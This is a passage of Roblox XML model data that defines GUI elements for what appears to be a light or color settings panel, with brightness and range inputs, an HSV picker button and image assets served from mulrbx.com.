													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXB464CB59DFE340C8B80781587C17E79F">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBXBB8569FA8604438C9CC01547292CCBF3">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190335</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBXE118180B73CC4DEA8091F82F08B97983">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="ImageButton" referent="RBX416BA7F9E06747A1B4716A872743D7D2">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">true</bool>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.400000006</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141313631</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<bool name="Modal">false</bool>
												<string name="Name">HSVPicker</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>160</XO>
													<YS>0</YS>
													<YO>-2</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>27</XO>
													<YS>0</YS>
													<YO>27</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
											<Item class="Frame" referent="RBXC3671DE6A29A4C63A9EFD0CE70FC6FA0">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">0.75</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">Shadow</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXB2D694C444C14CFF85C245F3B1CA9626">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX98DCF98151134501A527079D777C2746">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>16</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX7D86B4074A364002B963811EE4B5A395">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>10</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="Frame" referent="RBXFA025CE97D124DD5B7E1929B24360911">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">BrightnessOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>45</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX8EE9564EF16146E3A6DA7BD98F20E4E5">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Brightness</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX47FC543B00884DBDBE6820A24ED895CA">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Input</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>60</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX4DEABE4B76DB419E858B97E202A08ECC">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX3726927A89D544E4A25B598E65F7748E">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBXD0A8F00A9B8C4EA7A5CC0B553484CB23">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX0FF086AA2268442598475532710F9EB3">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">1</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX5C066F92D3FD4DB69620311389475BD1">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">RangeOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>110</XO>
												<YS>0</YS>
												<YO>45</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBXB25787256D254B2FB1819893D52D5733">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Range</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX737B1CA9042949CDB1025C5DB405C004">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Input</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>40</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX1CF747A085CF40DBB9E52191BB12B1C2">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXF172B645E84747EE850E867DF5CC0E0A">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
